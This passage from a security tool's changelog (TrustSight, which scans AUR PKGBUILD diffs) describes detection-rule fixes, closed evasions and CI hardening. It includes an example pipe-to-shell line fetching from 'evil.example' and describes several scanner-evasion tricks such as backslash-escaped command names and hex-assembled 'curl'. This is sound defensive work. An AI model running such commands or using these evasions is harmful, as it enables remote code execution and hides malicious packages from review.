  (benign p95 35, malicious p5 60). Severity overriding arithmetic is the shape
  B4 already establishes, where a FATAL caps the score at 100 regardless of the
  total. Enforced by `a critical finding never reads medium`.

- **A FATAL finding names itself in `risk_label`.** A FATAL caps the score at
  100, so it arrives as `Critical` - and so does a score that merely
  accumulated past 80. Those are different claims: a FATAL rule is
  unsuppressible by construction and the shipped ones target the *reviewer*
  rather than the machine. `risk_label` now reads `Critical (FATAL: R013)`.

  It rides the label rather than a new band deliberately. `risk` is a closed
  enum consumers gate on, and nothing is lost without a new member: the
  severity is in `score_breakdown` either way. Naming the FATAL does not
  displace B2's coverage qualifier, which the gate asserts. Enforced by
  `a fatal finding names itself in the label`.

- **Three sabotage fixtures were mislabelled as whole attacks.** The
  separation gate excludes single-signal probes by reading their declared
  `min_score` against `CRITICAL_MIN_SCORE` (40), and `S001`-`S003` declared
  exactly 40 - asserting a High-or-worse outcome for fixtures that are
  one-rule probes scoring `Medium`. They were the first fixtures to land
  exactly on that boundary; every existing CRITICAL probe scores above it by
  tripping more than one rule. Relabelled to `min_score: 30`, which is still
  true and correctly classifies them, restoring malicious p5 from 50 to 60.

- **The API and the CLI now emit the same JSON body (B11).** There were three
  machine-readable surfaces building three different dicts: `review --json`
  (14 keys), `inspect --json` (14 different keys) and the API's `to_dict()`
  (31 keys), with two naming conventions between them (`package` against
  `package_name`, `score` against `final_score`). The API body carried no
  `findings` at all while its docstring claimed to be what the CLI writes, so
  a consumer written against one path could silently miss evidence on
  another. All three now render through `reporting.report_body`, and every key
  in `reporting.REPORT_KEYS` is present on all of them with the same value.

- **Three fields were missing from terminal renders that the JSON carried.**
  Found by pushing one fact through all seven output methods and comparing,
  rather than by comparing JSON with JSON. Each of the three had a gate
  already, and each gate was aimed at the layer where the value is set rather
  than at the renders that have to show it:

    - `trustsight inspect` reported **nothing** about a coverage gap unless
      `--score` or `--risk` was passed. The gap rode the band label, and the
      default output correctly withholds the band, so the one light that must
      never be suppressible was suppressed by default on that command (B2).
      Both `inspect` renders now show it independently of any band.
    - `trustsight review` showed **suppressed rules only in its JSON body** -
      neither the Rich nor the plain render mentioned them, so an
      override-silenced rule looked, on screen, exactly like one that never
      matched (B5).
    - `trustsight inspect` without Rich had **no change summary**, so that
      terminal could not tell "nothing fired and nothing changed" from
      "nothing fired and a great deal changed" (B7).

  Enforced by the new `every render reports the same information` gate, which
  loops over all four renderers.

- **`review`'s plain renderer is now `_render_results_plain`.** It was inline
  in `_run_analysis_loop` and could not be called without a CLI invocation,
  which is why two of the three omissions above lived there:
  `contributing/security-review.md` says an ungateable path is where the
  dropped field will be, and it was.

- **A fork-bomb pattern was bounded before it shipped.** Two unbounded lazy
  spans plus a backreference in `S001` is a catastrophic-backtracking shape,
  and A5's 8 KiB clamp still leaves 8 KiB to backtrack across: it cost 2.4
  seconds on one hostile line and failed the `rule matching is bounded on
  hostile input` gate. Every span in the sabotage module now carries a
  constant ceiling, which brought the same line to 20 ms and the whole
  family's cost to within noise of the pre-existing baseline.

- **`inspect --json` no longer volunteers the score.** It always emitted
  `score`, `risk` and `risk_label` regardless of the flags, so the number the
  CLI is documented to withhold was the default for every machine consumer of
  that command. The score group is now withheld on every surface unless asked
  for: `--score`/`--risk` on the CLI, `include_score=True` on the API.
  Per-finding `weight` moved to the verbose `score_breakdown`, since a weight
  is score arithmetic. Attribute access is unchanged - `report.score` is
  always populated, because naming the field is the request.

  **Breaking for consumers of `Report.to_dict()`**, which now returns the
  CLI's report body rather than the serialised `PackageFact`. The stored
  record is available as `Report.raw`, in its own storage naming.

- **`display._fact_to_dict` is gone.** It was `inspect --json`'s private body
  builder; with that path on the shared one it had no callers, and the
  `every JSON report carries the fingerprint` gate was still aimed at it -
  a gate passing against a function no JSON path calls, which is the same
  failure mode in a new place. The gate now exercises `report_body` (with and
  without the score) and the stored `fact_json` beside it.


- **CI installs from the lock.** Every workflow used `pip install -e ".[dev]"`,
  resolving five runtime dependencies fresh from PyPI on every push - a live
  remote dependency inside the job that certifies the security model, and the
  softest edge of the stated "CI is not compromised" assumption. Workflows now
  use `uv sync --locked`, which resolves nothing and installs exactly the
  pinned, hashed versions in `uv.lock`. Enforced by the new `CI installs from
  the lock` gate. `astral-sh/setup-uv` is pinned by commit SHA like every
  other action.

  The flag is `--locked` and not `--frozen` deliberately. Both install from
  the lock and resolve nothing, but `--frozen` performs no check that the
  lock still matches `pyproject.toml`: a dependency added to the manifest and
  never locked is silently ignored, and the job installs an older closure
  while appearing to honour the manifest. `--locked` fails instead, which is
  what makes the lock load-bearing rather than merely present.

- **`uv.lock` was stale.** It recorded the project at 0.11.0, two releases
  behind, so nothing could have installed `--frozen` from it. Refreshed; the
  dependency set was already correct and did not change.

- **`cryptography` now has a floor (`>=42.0`).** It had no lower bound at all,
  despite being the module that verifies the signatures A13 and A13b rest on.

### Added

- **A `supply-chain` workflow**: exports the locked closure, generates a
  CycloneDX SBOM, and reports known advisories against it, weekly and on
  dependency changes. Deliberately **non-blocking**. Making it a gate would
  put a remote advisory feed in the path of every push, which is what every
  other workflow's `--frozen` install exists to remove, and an advisory is
  evidence about a library rather than a verdict about this program. The
  "dependencies are trusted" assumption stands; what changes is that the
  project can now see when it stops holding.

- **[Sandboxing the tokenizer](explanation/sandboxing-the-tokenizer.md)**, a
  design note on the larger of the two architectural limits. It argues the
  tokenizer is the component worth isolating and the renderer is not, states
  what isolation would *not* buy (it bounds the blast radius of a defect, not
  the correctness of expansion), and records three conditions under which it
  should be built. Nothing is scheduled; the point is that the current
  position is a choice with its reasoning written down.

### Added

- **`trustsight review --deps` reviews the dependencies instead of the
  packages.** An AUR package's `depends` are built by the same `makepkg` run
  on the same machine, and the June 2026 campaign is the argument for looking
  at them: it hijacked orphans, and an orphan is far more often somebody's
  dependency than the thing they meant to install. A default review already
  analyses direct dependencies, but reports each as a *summary card* under the
  package that pulled it in; this makes each one the subject of its own panel,
  with its findings, its diff and its verdict.

  Each dependency reports **Required by**: the packages in the reviewed set
  that declare it. That is the reverse of the relationship the rest of the
  report describes, and it needed its own walk. `walk_dependencies` shares its
  `already_seen` across roots so a dependency twenty packages need is analysed
  once - right for a per-package report, and wrong here, because it attributes
  the dependency to whichever root reached it first. `dependency_closure` keeps
  every edge and analyses each package once.

  `--depth` applies to the closure: `--deps --depth 2` reviews direct
  dependencies *and theirs*, rather than walking two levels below each. Roots
  are not reviewed - that is the no-flag view. The same `MAX_DEPTH_LEVELS` and
  `MAX_DEPTH_NODES` ceilings bound the walk, because the graph is written by
  the party under review, and a closure cut short says so.

  `required_by` is in the JSON body and on `Report` too, and
  `TrustSight.review(deps=True)` is the API's spelling of the flag - a field
  the API can carry but never populate is a field that does nothing, and the
  closure walk lives in the engine so both surfaces reach the same one. An
  ordinary review now ends with a one-line pointer at the flag, shown only when
  something reported a dependency: advice about an empty set is noise, and so
  is advice you already followed.

- **Documentation caught up with the terminal.** The quickstart still showed a
  three-column `Package / Risk Score / Verdict` table that the tool has not
  rendered in a long time - and showed a score column by default, which is the
  opposite of what it does. The `inspect` sample printed `Status` twice and
  described the plain renderer as "a condensed subset", both of which were true
  before this release and are not now. The README's 30-second example carried
  the doubled rule id and `checksums checksum added or changed` verbatim, which
  is where the report of those defects came from. Every sample in the docs is
  now generated from the renderers rather than written by hand.

### Changed

- **Crossfire asks which *file* a line is in, not which function.** The scope
  gate was an allowlist of the five standard makepkg function names, and the
  function a payload sits in is chosen by the person being reviewed. Four
  spellings walked past all seven rules:

    - `package_libfoo()` - a **split package**. makepkg calls
      `package_$pkgname()` for each name in a split recipe, so renaming
      `package` was a one-word bypass. It is the commonest function shape in
      the AUR after the standard five.
    - `package_google-chrome-bin()` - worse: a pkgname may hold a hyphen and
      the shared classifier's `\w+` does not match one, so the header matched
      *neither* function expression. The body classified as `other`, invisible
      to every rule with a scope, not just this family. Fixed in `rules.py`
      with makepkg's own name class.
    - `_helper()`, called from `build()`.
    - a payload at **top level**, which runs when makepkg *sources* the
      recipe, before any build step - something the project already documents
      under `unresolved_parse_time` and the rules were not reading.

  A `PKGBUILD`, a `.install` scriptlet and a shell companion are shell from
  the first line to the last, top level included; a `.desktop`, a `.patch` and
  a `.SRCINFO` are not shell in any scope, which is a sharper exclusion than
  the old gate managed even when it worked.

  Widening it exposed four parser gaps the narrow gate had been hiding, each a
  line whose command position lives elsewhere: a multi-line array literal
  (`depends=(` then one entry per line), a multi-line `[[ ]]` test, a
  multi-line double-quoted string, and `[[ -n "$a" && "$a" != "$b" ]]` being
  split on its `&&` - a conditional that mentions a variable is most of the
  shell ever written. Plus one that was never about position: `command -v
  "$cmd"` asks where `$cmd` is and runs nothing.

  The family still fires on **zero** of the 3,246-diff benign corpus.

- **The crossfire family fires on zero of the 3,246-diff benign corpus, down
  from X002's 0.678%, while eleven more evasions are closed - ten here and one
  in the tokenizer.** Rate and recall
  moved in opposite directions, which is the only combination worth having, and
  it happened because none of the false positives were arguments about what
  counts as evasion. Every one was a rule looking in the wrong place.

    - **Function scope leaked across file boundaries.** A hunk shows part of a
      file, so a `package() {` whose closing brace fell outside it left the
      brace counter raised for the rest of the diff, placing every *following
      file* inside that function. A `.desktop` file's translated `Name[be]=`
      line was read as shell and matched X002's homoglyph shape - Cyrillic in a
      translation impersonates nothing and names no command. Fixed in the
      shared classifier in `rules.py`, so every scoped rule gets the
      correction, not just this family.
    - **A modified continuation tail lost its head.** The joiner joins lines
      carrying the same diff marker, so editing the tail of a `\`-continued
      command separates the halves with the removed version. The `+` line
      arrived alone and its first word - an argument to a command two lines up
      - read as a command name.
    - **`eval` was scored twice.** R039 already claims
      eval-of-dynamic-content; treating `eval` as a wrapper walked into its
      argument and drew a second CRITICAL on the same bytes. That is the thing
      this family says it never does, and the reason there is no X008 beside
      R013.
    - **A variable naming a directory is not a hidden command.**
      `"$srcdir/calibre-release/calibre-debug"` spells its executable out. The
      shape matched it because the variable name was allowed to match a
      *prefix* of itself, so `${pkgdir}/etc/x` read as `${pkgdi}` + `r`. Now
      the name is maximal, and a `/` after it means a path while an operator
      inside the braces (`${c//X/}`) still means assembly.
    - **`CMD=$(which x)` names its executable literally**, one line up, where
      every payload rule reads it. Exempted as the discovery idiom rather than
      as assignment in general: `CMD=$(printf '\x63\x75\x72\x6c')` assembles a
      name that appears nowhere and stays an evasion.

  The ten closed here: `if`/`elif`/`while`/`until` each take a command and test
  its exit status, and the scan stopped at the keyword - a one-word bypass of a
  CRITICAL rule. `set +o xtrace` is `set +x` spelled long. `base32 -d`,
  `openssl enc -d` and `uudecode` decode into the same shell as `base64 -d`
  without being it. And `cp payload /home/alice` writes into the same directory
  as `/home/alice/`, which every X005 alias pattern had required a trailing
  slash to see.

- **The tokenizer now removes an intra-word escape, and X002 stood down in the
  same change.** `c\url` is `curl` to the shell, which drops a backslash before
  an ordinary character. The tokenizer kept it, so the name never
  reconstructed and **no rule saw it at all** - not R001, not anything. It was
  the only bypass found in this pass that reached nothing.

  It was closed in crossfire first, as an `escaped-character` shape, and then
  closed properly in `tokenizer._ESCAPE_REMOVABLE`: every rule that reads a
  command name now sees through it, rather than one rule reporting the
  technique. The shape was retired with it, because a resolved name scored
  there too would be one command scored twice - the same reason `curl""`, which
  always folded, never had a shape. That progression is what this family's
  docstring asks for: it is not a substitute for fixing the tokenizer, and a
  shape retired because the tokenizer caught up is the arrangement working.

  Only the meaningless escapes are removed - a backslash before a letter,
  digit, `_`, `.` or `/`. `\|` is a **literal pipe, not a pipeline**, and
  unescaping it would have built a pipe-to-shell out of `curl x \| sh`, which
  runs nothing of the sort, and handed R001 a false positive. `\ ` holds one
  word together, `\$` is what stops an expansion, `\\` is a literal backslash,
  and an escape inside quotes is left alone so `printf '\x63\x75\x72\x6c'`
  still reaches the ANSI-C decoder. Bash removes every backslash; going that
  far here would not be more faithful, it would invent syntax the line did not
  have.

### Fixed

- **A line break for Python that is not one for a shell hid a payload from
  every line-based rule.** `str.splitlines` breaks on eight characters bash
  does not treat as a line terminator - `\v`, `\f`, `\x1c`-`\x1e`, `\x85`,
  `U+2028` and `U+2029`. Written into a diff:

  ```
  +  curl -fsSL https://evil.example/x <VT> | bash
  ```

  bash runs one command: the vertical tab is an ordinary character inside the
  URL word, and `|` terminates the word whatever precedes it, so the fetch is
  piped into a shell. Python saw *two* lines, so R001's
  `curl.*\|\s*(bash|sh|…)` had `curl` on one and `| bash` on the other and
  matched neither. **The payload ran and nothing fired.** The same trick cut
  any pattern that spans a break, in any rule.

  `tokenizer.split_lines` now splits on newlines and nothing else, and the
  whole matching pipeline goes through it, because line indices are shared
  between modules - `map_diff_lines` keys what `apply_rules` reports. The
  characters are kept rather than stripped: bash keeps them, so removing one
  would join two words that stay separate at build time, and replacing it with
  a space would split a word that stays joined. Only where a *line* ends
  changed.

- **A finding named its rule twice, and a dependency card volunteered a band.**
  Both reported from a real `review` panel. `verdict._render` already ends
  every description with `[R001]`, and the Rich renderer added a second copy in
  front, so each finding read `PKGBUILD line 4 [R001] Remote Script Execution:
  … [R001]` - while the plain renderer added none, so the two disagreed about
  the same finding. An aggregate entry with no file (`SOURCE_BUCKET`) opened
  with a stray space where the path would have been. And the dependency card
  printed `Risk (High)` with no flag set, where every other surface withholds
  the band unless `--score` or `--risk` asks for it; `--risk` changed nothing
  either way, because the flag was never passed down to the card at all.

- **A first analysis threw away the findings it had just made.** The most
  serious of a batch found by hunting the *shape* of the metadata-snapshot bug
  rather than its details: something computed, recorded, and then not read.

  `_make_fresh_analysis` ran the recency check, the new-package check and the
  committed-tree scan, handed the results to `insert_analysis`, and then built
  the fact with an empty `score_breakdown` and a hardcoded score of 0. A
  first-seen package shipping an ELF binary in its git tree - R118, the Atomic
  Arch delivery shape - reported **Low, score 0, no findings**, with the
  finding sitting in the database row it had just written. First-seen is the
  case with the least prior evidence about a package, so it is the last one
  that should be reported clean without looking. The corpus path in
  `full_aur/analyze.py` had been scoring its own first-seen facts all along;
  the two had drifted. The review path now uses the same scorer, and carries
  the maintainer and the IOC matches it can also see without a diff.

- **`[limits] default_review_limit` was documented, shipped, and never read.**
  `--limit`'s own default of `0` won on every invocation, so a user who set the
  key saw no change. It is honoured now, and the shipped value moves from `20`
  to `0`: a review that stops early has not looked at the rest, and narrowing
  what an existing install covers is the wrong direction for the default. An
  explicit `--limit 0` still means all of them and beats the config.

- **A truncated review reported the truncation as a smaller problem.** With
  `--limit 5` against 40 outdated packages the summary read "5 package(s)
  needing update and reviewed": the count of packages *needing* an update was
  silently replaced by the count the limit let through, so the number was wrong
  in the direction that reads as reassuring, and the 35 skipped were never
  mentioned. The summary now names them.

- **Two sections existed only on the Rich renderer.** `inspect` without Rich
  showed no *Resolved commands* section at all - the reconstructed command text
  behind a finding, the deobfuscated `curl` a rule matched on - and no
  maintainer or line counts. `review --verbose` handed off to the full inspect
  panel on the Rich path and returned the same summary on the plain one, so
  asking for detail got you detail only if Rich happened to be installed. Both
  renderers now carry the same sections, and `tests/test_output_parity.py`
  compares them against each other rather than only against the JSON body,
  which is what let the gap sit there: the fixture never populated
  `execution_changes`, and a renderer exercised with an empty section is not
  exercised.

- **The AUR-side version dropped the declared `epoch` and `pkgrel`.** Reported
  by the maintainer of `oolite-git`, whose recipe declares `epoch=1`,
  `pkgver=1.93.1.r7966.7ccbff5e` and `pkgrel=2`, against an install of
  `1:1.93.1.r7967.caea422f-2`. `inspect` rendered the right-hand side as
  `1.93.1.r7966.7ccbff5e`, because `get_pkgver_from_head` matched `^pkgver=`
  and nothing else. The two sides of that line were not the same kind of
  object.

  It was not only display. `compare_installed_to_aur` compares epochs first
  and parses an absent one as zero, so a **non-VCS** package declaring
  `epoch=1` compared 1 against 0 and came out as *installed ahead*: a real
  update reported as a backwards move. `oolite-git` never reached that branch
  only because the VCS short-circuit fires first.

    - `full_version_from_pkgbuild` assembles `[epoch:]pkgver[-pkgrel]` from
      the recipe's own fields. A component that is not literal - `pkgver=$_ver`
      - is omitted rather than guessed at, and no literal `pkgver=` at all
      returns nothing, leaving the existing fallbacks in charge.
    - With both sides full, they are compared as full versions, pkgrel
      included, which is what pacman and every AUR helper do. An AUR `pkgrel`
      bump is now the update it always was; it used to render as "no change"
      even though discovery had just listed the package as outdated on
      exactly that difference. A side that declares no pkgrel still compares
      by epoch and pkgver alone - a pkgrel that was never declared cannot be
      a difference.

- **"Not comparable" never said why, so the reporter reasonably blamed the
  epoch.** `oolite-git` is inconclusive because it computes its version in
  `pkgver()`, which is a deliberate refusal: the AUR text records whatever
  the maintainer's last build produced, so it is stale by design rather than
  predictive. That reasoning was in the source and not in the output. The
  version line now names the cause, and distinguishes it from the other case
  the same constant covers - a version that could not be read at all -
  without adding a field to the report body.

- **A first analysis still drew the backwards arrow.** The reporter's first
  `inspect` printed `1:1.93.1.r7967.caea422f-2 -> 1.93.1.r7966.7ccbff5e` and
  the second, with a prior analysis on record, printed "not comparable":
  whether a downgrade was drawn as an update depended on how many times the
  package had been inspected. `_make_fresh_analysis` never set
  `version_comparison`. The suppression added in 0.12.0 had landed on the
  incremental path only.

- **The inspect panel printed `First analysis.[]` and said Status twice.**
  `[]` is not a Rich close tag, so it rendered literally and the style never
  closed; the same row duplicated the Status line the foot of the panel emits
  unconditionally.

- **A quadratic pattern was scored safe because its alphabet was punctuation.**
  `_representatives` harvested escapes, character classes and the first
  *alphanumeric* literal, so `/+$` derived no alphabet at all, `growth_ratio`
  fell back to probing with `a` - which `/` can never match - and both
  measurements came back at zero. Zero is below the noise floor, the growth
  check was skipped, and a skipped measurement scored the same as a fast one.
  The module's docstring had already named this class of failure: "a fixed
  probe list is the attacks somebody thought of, and the classes it omits
  score zero rather than unknown". The `or ["a"]` fallback was the same trap
  one level down, unguarded.

    - Literals are now harvested whatever their character class, with the
      pattern's *syntax* - a `:` from `(?:`, a digit from `{1,64}`, a class
      body - stripped first, since probing with syntax is the same wrong
      alphabet in a different costume.
    - The fallback for a pattern whose alphabet cannot be derived is several
      characters wide, and says in place that unmeasured is unknown, not safe.
    - The widened detector immediately caught a **shipped** rule: R007's
      `\+.*\.install.*` is quadratic. It is now `^\+.*\.install`, matching
      exactly the same text on an added line, where the diff marker is at
      position 0. An installation written before this release still holds the
      old pattern and, because a refused pattern stops matching *silently*,
      would lose the rule: the superseded pattern is registered so
      `trustsight config sync-rules --update` repairs it, `trustsight lint`
      reports it as an ERROR, and the refusal log now names the pattern.

- **`review` compared against a metadata snapshot it never refreshed, so a
  machine with pending AUR updates was told it had none.** Reported from a
  0.13.1 install where `trustsight review` printed "No outdated packages
  found" while `yay -Syu` listed four AUR updates on the same system. The
  snapshot was downloaded on first run and reused unconditionally from then
  on: `load_metadata` recorded `snapshot_time` and no caller ever read it,
  and the only code path that refetches the dump is the corpus builder, which
  a `review`-only user never runs. So this was not an edge case, it was every
  installation's steady state after the first day.

  The failure mode is what makes it severe rather than merely wrong. A stale
  snapshot does not produce an error or an empty result: every installed
  package resolves to the version the snapshot recorded, `vercmp` says they
  are equal, and the tool answers "nothing to review" in green. The one
  output a security tool must never produce quietly is *all clear* when it
  has not looked.

    - The snapshot is now refetched once it is older than
      `[discovery] metadata_ttl_minutes` (default 60, matching the RPC path's
      `cache_ttl_minutes`), and `load_snapshot` returns the timestamp
      alongside the packages so the age cannot be dropped on the floor again.
    - A snapshot with no recorded timestamp counts as stale, so an existing
      install self-heals on its next review rather than needing the file
      deleted by hand.
    - A refresh that fails keeps the snapshot on disk and **warns**, naming
      its age and saying a package updated since then will not be reported.
      Falling back to "no outdated packages" on a network failure would
      reproduce the original bug at the moment the user is least able to
      notice it. An empty dump is refused for the same reason: it would
      overwrite a working snapshot with nothing.
    - `metadata_ttl_minutes = 0` restores the old behaviour for an offline
      machine that must pin the snapshot it has.

- **The AUR PKGBUILD advertised v0.13.1 with v0.13.0's checksum.** Reported
  by a user, and accurate: the recorded `f083582...` is the v0.13.0 tarball,
  while v0.13.1 hashes to `6c19cea4...`. The checksum was written by a second
  commit *after* the tag, because GitHub's on-demand archive cannot exist
  until the tag does, so every release passed through a window where the
  branch was inconsistent. For v0.13.1 the workflow that closes that window
  failed and the window never closed. Contributing cause: `check()` run from
  the release tarball failed three tests, one of which was a direct
  contradiction between `.gitattributes export-ignore` (which removes
  `packaging/` from the archive) and the `critical paths are synchronised`
  gate (which required `packaging/aur/PKGBUILD` to exist).

### Changed

- **The source is a release asset built by this repository, not GitHub's
  generated archive.** `scripts/build_release_tarball.py` produces the
  tarball deterministically: mtimes, uid/gid and member order normalised,
  gzip given no timestamp, output a pure function of the paths and contents
  `git archive` selects. Because `packaging/` is export-ignored, recording
  the checksum in the PKGBUILD cannot change the tarball it describes, so the
  checksum ships in the same commit as the version bump and no repair step
  exists to fail. Release assets are immutable, which also closes the
  long-standing exposure to GitHub regenerating archives and invalidating
  recorded checksums, as it did ecosystem-wide in 2023.

- **`release-pkgbuild.yml` verifies instead of repairing.** It no longer
  computes a checksum or commits to the default branch. On a published
  release it rebuilds the tarball from the tag, asserts the PKGBUILD already
  records that checksum, asserts the published asset is those exact bytes,
  and then builds and installs it with `check()` enabled.

- **The critical-path existence check tolerates the archive.**
  `ARCHIVE_EXCLUDED_PATHS` in `scripts/critical_paths.py` names the paths
  `export-ignore` legitimately removes; the gate skips their existence check
  when running from an extracted tarball and enforces it everywhere else.
  `test_packaging_is_export_ignore_from_archives` skips when there is no git
  checkout to archive rather than failing on `dubious ownership`.

### Stats

- 6 commits since v0.13.1
- 2599 tests (57 files), all passing
- 65/65 security gates, 10/10 calibration gates
- Package version 0.13.2

## [0.13.1] - 2026-08-12

### Fixed

- **The PKGBUILD workflow failed twice on every release.** A release moves
  `pkgver` and the recorded checksum in two separate commits, and it cannot
  do otherwise: the checksum is of the tarball GitHub builds from the tag, so
  it is unknowable until the tag exists. `pkgbuild.yml` runs on every push,
  including the version-bump commit and the tag pointing at it, and asserted
  that the recorded checksum matches the tarball for the recorded version.
  Between those two commits that assertion cannot hold, so the job failed for
  a state the release procedure guarantees, once for the branch push and once
  for the tag push. The workflow now identifies the window (the tag for
  `pkgver` does not exist yet, or `HEAD` is the tag's own commit) and skips
  the tarball steps with a notice. Outside the window the assertion is
  unchanged and just as strict.

- **`check()` never ran against the release tarball it was added to
  protect.** v0.12.1 added a build of the shipped artifact so a regression
  that breaks it fails CI instead of reaching users, but that build lives in
  `pkgbuild.yml` and could not see the release it was meant to guard. The
  only commit where the checksum assertion can pass is the
  `packaging: set checksum for vX` commit, which `release-pkgbuild.yml`
  pushes with `GITHUB_TOKEN`, and GitHub does not trigger workflows from such
  pushes. The guarantee therefore first held on the next unrelated push, well
  after users could install the release. `release-pkgbuild.yml` now builds
  and installs the tarball itself (`makepkg -si --noconfirm`, no `--nocheck`)
  in the job that already has the container, the tarball and the corrected
  PKGBUILD, so the release run proves the artifact before publishing it.

### Stats

- 4 commits since v0.13.0
- 6 files changed, +106 / -6
- 2029 tests (47 files), all passing
- 51/51 security gates, 10/10 calibration gates
- Package version 0.13.1

## [0.13.0] - 2026-08-12

### Added

- **A public API (`trustsight.api`).** Every flow the CLI drives is available
  as a library: `TrustSight` exposes `inspect`, `analyze_text`, `review`,
  `refresh_corpus`, `watch`, `pivot`, `history`, `packages`, `forget`,
  `prune`, `config` and `status`, returning frozen dataclasses (`Report`,
  `ReviewResult`, `Finding`, `HistoryEntry`, `TrackedPackage`, `CycleReport`,
  `PivotResult`, ...) whose `to_dict()` is byte-identical to the
  corresponding `--json` output. The `trustsight` package resolves these
  names lazily (PEP 562), so `import trustsight` for `__version__` alone
  never loads typer, rich or the analysis stack. The CLI and the API share
  one pipeline: the review engine moved out of `cli/review.py` into
  `trustsight.review`, and `cli/review.py` keeps its historical spellings as
  re-exports. `review --json` during a metadata bootstrap now reports
  `{"status": "metadata_downloaded", ...}` and stays a pure JSON document.
  See [python-api.md](reference/python-api.md).

- **Shared CLI/API evaluation semantics.** The public API and CLI now consume one reporting layer for findings, verdicts, risk bands, coverage, changes, suppressions and JSON serialization. API limits, explicit package lists and watch parameters are validated before analysis begins, and API results are returned as dataclasses without rendering terminal output.

- **Public API inputs are bounded before side effects.** Package and indicator names, repository and package lists, PKGBUILD text, metadata text, and history/review limits now have explicit ceilings with type and boolean validation.

- **Adversarial security coverage.** Deterministic tokenizer fuzzing, regex audits, differ hostile-input checks, archive hardening tests and critical path policy tests are now part of the test and security-gate coverage.

- **A rule taxonomy (`RuleCategory`).** `src/trustsight/categories.py` gives
  every documented rule exactly one category naming the kind of claim it
  makes: `fetch-and-execution`, `obfuscation`, `deception`,
  `install-and-persist`, `staging-and-recon`, `integrity`,
  `naming-and-dependency`, `maintainer-and-metadata`, `temporal`,
  `composition`, `count-based`, `corpus-behavioral`, and `crossfire`
  (reserved, no rules). This is a different axis from the per-rule
  `category` field, which names the capability a match touched and is what
  R072 counts; nothing about findings, scoring or the report payload
  changes. `RULE_CATEGORIES` maps all 128 documented sections,
  `category_of()` and `rules_in()` read it, and `tests/test_docs.py` fails
  if a rule is uncategorised, documented on a page its category does not
  own, or missing from the index.

### Changed

- **The rules reference is one page per category.** `reference/rules.md`
  became `reference/rules/`, with [an index](reference/rules/index.md)
  carrying the type legend and a quick-reference table for all 128 rules,
  one page per `RuleCategory`, and
  [`system.md`](reference/rules/system.md) holding everything that is not an
  individual rule definition: the `rules.toml` field table, the severity
  weights, the FATAL short-circuit, the measured fire rates, the Class A to
  E taxonomy, the C-series and D-series sections, and the reserved
  identifier ranges. Every meta anchor (`#c-series`, `#d-series`,
  `#fatal-rules`, `#class-d-rules`, `#experimental-fire-rates`,
  `#not-rules`, ...) keeps its spelling on `system.md`, which also keeps a
  stub anchor for every rule id pointing at the page that now defines it, so
  no `#rXXX` link breaks. The index's legend and table are generated by
  `scripts/build_rules_index.py`. Rule text is unchanged.

- **Differ input is bounded and deterministic.** Generated patches, companion files, paths, and extracted URL tokens now have explicit limits; companion blobs are checked before reading, malformed hunks fail closed, and URL/file summaries use stable ordering. Adversarial differ tests and security gates cover hostile size, malformed syntax, and repeatability.

- **Diff truncation is UTF-8-safe and shared across analysis paths.** Git and offline analysis use the same bounded prefix helper and preserve an explicit truncation flag, so partial multibyte input cannot corrupt parser text and truncated results remain covered by `diff_truncated`.

- **The rules reference documents every implemented rule.** Added sections
  for R132 (Indirect Command Expansion), R136-R140 (Committed File Executed
  Without Declaration, Fetch Then Execute, Downloaded Source File Executed,
  Service ExecStart Targets Undeclared Binary, PATH Injection With Undeclared
  Directory) and a Declared-practice findings subsection for P001-P007; the
  delivery section header and Tier A span now cover R001-R140.

- **Tokenizer hostile-input coverage was expanded.** A deterministic fuzz harness now exercises assignments, nested and cyclic expansion, malformed quoting, arrays, namerefs, command substitutions, diff markers, Unicode, memoization and the `scan_diff` boundary. It asserts bounded output, termination, deterministic results and JSON-safe integration output without changing the deliberately open R133-R135 behavior.

- **Regex backtracking remains bounded by input clamping.** Rule matching still uses Python's standard `re` module; every logical line is clamped to 8 KiB before matching and the security gates measure hostile matching time. A staged regex hardening plan is documented in the security model rather than adding a new runtime dependency without comparative evidence.

- **Configured regexes now fail closed at runtime.** A pattern that exceeds the bounded adversarial probe budget is refused by the rule compiler instead of being run against package-controlled text. `scripts/regex_audit.py` audits configured and source patterns, and `scripts/benchmark_regex_engines.py` provides an optional comparison with the third-party `regex` engine without adding it as a runtime dependency.

- **CI actions are pinned to immutable commit SHAs.** GitHub workflow actions no longer follow mutable version tags, and the signed-commit workflow shares one canonical critical-path list with the security policy and contributor guidance.

- **Seed archive handling is stricter.** Seed imports now cap archive member counts and refuse symlinks, hardlinks, device nodes and FIFOs before extraction, preserving the existing size and path-containment limits.

- **Documentation and default-report language were aligned with the security model.** The README now describes deterministic evidence reports rather than risk-score verdicts, documents the opt-in `--score`/`--risk` display, removes the obsolete LLM wording, and points at the published documentation site.

### Stats

- 19 commits since v0.12.1
- 84 files changed, +8112 / -2415
- 2029 tests (47 files), all passing
- 51/51 security gates, 10/10 calibration gates
- Package version 0.13.0

## [0.12.1] - 2026-08-11

### Changed

- **The release tarball's checksum is validated end to end in CI.** The Arch
  containers install git before checkout, so `actions/checkout` performs a
  real clone instead of falling back to the source archive (which honours
  `.gitattributes` `export-ignore` and therefore omits `packaging/`). The
  `PKGBUILD` workflow downloads the actual shipped tarball, fails the build
  with an explicit error on a checksum mismatch, and builds from it with
  `makepkg`; no `--skipchecksums` anywhere. The release workflow computes the
  checksum from the served tarball, verifies it with
  `makepkg --verifysource`, and commits the PKGBUILD and `.SRCINFO` to the
  default branch; the tag stays frozen so the tarball, and therefore the
  checksum, stays stable.
- **The PKGBUILD CI job now executes `check()` against the release tarball.**
  The build step dropped `--nocheck`, so a regression that breaks the shipped
  artifact fails the `PKGBUILD` workflow instead of reaching users.
- **Calibration figures refreshed to the 3,246-diff locked corpus.** The
  published numbers now match the committed corpus: 69.1% benign zero-rate,
  benign p95 = 45 against malicious p5 = 60, strict positive separation as
  the only separation gate. The stale 3322-diff references and pre-B10
  numbers across [security.md](security.md), the reading-a-report guide,
  fire-rates, the benchmarks page and the index pages were reconciled, and
  the CONTRIBUTING quick start now runs the security gates.
- **The README was modernized** to match the current CLI surface and the
  signed release channel, with verified links across the documentation.

### Added

- **R122: the corpus path reports archive trailer anomalies.** The snapshot
  tarball bytes fetched for the full-AUR corpus now go through
  `check_archive_trailer`, a pure function over bytes: trailing bytes after
  the gzip member, a missing tar end-of-archive block, or content after the
  zip end-of-central-directory record produce a stamped R122 finding,
  surfaced exactly like the R118-tree scan results. The review path still
  never downloads PKGBUILD-declared URLs, so R122 only ever sees the AUR's
  own snapshot tarballs; see [rules.md](reference/rules/integrity.md#r122).
- **The malicious corpus is committed source.** All 164 malicious `.diff`
  bodies are now committed (a gitignore override for
